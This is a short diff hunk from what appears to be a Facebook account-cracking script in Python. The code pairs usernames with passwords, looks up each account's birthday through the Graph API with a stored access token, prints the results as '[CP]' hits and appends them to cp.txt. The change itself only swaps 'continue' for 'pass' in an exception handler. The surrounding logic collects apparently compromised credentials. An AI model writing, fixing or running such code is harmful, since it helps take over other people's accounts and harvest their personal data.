@@ -790,7 +790,7 @@ class bapittl:
           ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
           tt=json.loads(ke.text)
           ttl=tt["birthday"]
-        except:continue
+        except:pass
         self.cp.append(username + ' • ' + password + ' • ' + ttl)
         print("\r\x1b[0;33m[CP] %s • %s • %s\x1b[0m   "%(username,password,ttl))
         save = open('cp.txt', 'a+')
